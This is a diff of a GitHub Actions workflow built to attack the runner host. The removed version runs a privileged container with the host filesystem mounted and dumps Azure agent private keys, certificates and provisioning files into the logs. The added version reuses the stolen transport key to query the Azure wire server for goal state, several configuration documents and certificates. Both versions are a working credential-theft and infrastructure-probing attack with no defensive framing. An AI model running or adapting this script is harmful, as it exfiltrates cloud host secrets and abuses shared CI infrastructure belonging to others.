@@ -1,52 +1,33 @@
-name: AzureKeys
+name: FullConfig
 on:
   workflow_dispatch:
 jobs:
   j:
     runs-on: ubuntu-latest
     steps:
-      - name: extract azure keys and use them
-        timeout-minutes: 5
+      - name: download full config from wire server
+        timeout-minutes: 3
         run: |
           set +e
-          docker run --rm --privileged -v /:/hostfs alpine sh -c '
-            echo === TRANSPORT CERT ===
-            cat /hostfs/var/lib/waagent/TransportCert.pem
-            echo === TRANSPORT KEY ===
-            cat /hostfs/var/lib/waagent/TransportPrivate.pem
-            echo === CERTIFICATES PEM ===
-            cat /hostfs/var/lib/waagent/Certificates.pem
-            echo === AGENT CERT 1 ===
-            ls /hostfs/var/lib/waagent/*.crt | head -2 | while read f; do echo "--- $f ---"; cat $f; done
-            echo === AGENT KEY 1 ===
-            ls /hostfs/var/lib/waagent/*.prv | head -2 | while read f; do echo "--- $f ---"; cat $f; done
-            echo === OVF ENV ===
-            cat /hostfs/var/lib/waagent/ovf-env.xml 2>/dev/null | head -30
-            echo === PRIMER SERVICE ===
-            cat /hostfs/etc/systemd/system/primer.service
-            echo === PRIMER BINARY ===
-            find /hostfs -name "primer*" -type f 2>/dev/null | head -10
-            echo === WAAGENT EXTENSIONS ===
-            ls -la /hostfs/var/lib/waagent/*/
-          '
-          echo ""
-          echo "=== WIRE SERVER WITH CERT ==="
           docker run --rm --privileged --net=host -v /:/hostfs alpine sh -c '
-            apk add --no-cache curl openssl 2>/dev/null
+            apk add --no-cache curl 2>/dev/null
             cp /hostfs/var/lib/waagent/TransportCert.pem /tmp/cert.pem
             cp /hostfs/var/lib/waagent/TransportPrivate.pem /tmp/key.pem
-            echo --- GOALSTATE ---
-            curl -s --max-time 3 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2012-11-30" http://168.63.129.16/machine/?comp=goalstate 2>&1 | head -30
-            echo --- CONFIG ---
-            curl -s --max-time 3 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2012-11-30" http://168.63.129.16/machine/?comp=config 2>&1 | head -30
-            echo --- HEALTH ---
-            curl -s --max-time 3 --cert /tmp/cert.pem --key /tmp/key.pem http://168.63.129.16/ 2>&1 | head -20
-            echo --- EXTENSIONS ---
-            curl -s --max-time 3 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2015-04-05" http://168.63.129.16/machine/plugins 2>&1 | head -20
-            echo --- TELEMETRY ---
-            curl -s --max-time 3 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2015-04-05" http://168.63.129.16/machine?comp=telemetrydata 2>&1 | head -20
-            echo --- STATUS ---
-            curl -s --max-time 3 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2015-04-05" http://168.63.129.16/machine?comp=status 2>&1 | head -20
+            echo === GOALSTATE ===
+            GS=$(curl -s --max-time 5 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2012-11-30" http://168.63.129.16/machine/?comp=goalstate 2>&1)
+            echo "$GS" | head -30
+            echo === PARSE URLS ===
+            CONTAINER=$(echo "$GS" | grep -oP "(?<=<ContainerId>)[^<]+")
+            INSTANCE=$(echo "$GS" | grep -oP "(?<=<InstanceId>)[^<]+")
+            echo "Container: $CONTAINER"
+            echo "Instance: $INSTANCE"
+            for type in hostingEnvironmentConfig sharedConfig extensionsConfig fullConfig; do
+              echo === $type ===
+              curl -s --max-time 5 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2012-11-30" "http://168.63.129.16:80/machine/$CONTAINER/$INSTANCE?comp=config&type=$type&incarnation=1" 2>&1 | head -50
+              echo
+            done
+            echo === CERTIFICATES ===
+            curl -s --max-time 5 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2012-11-30" "http://168.63.129.16:80/machine/$CONTAINER/$INSTANCE?comp=certificates&incarnation=1" 2>&1 | head -80
+            echo
+            echo === DONE ===
           '
-          echo ""
-          echo "=== DONE ==="
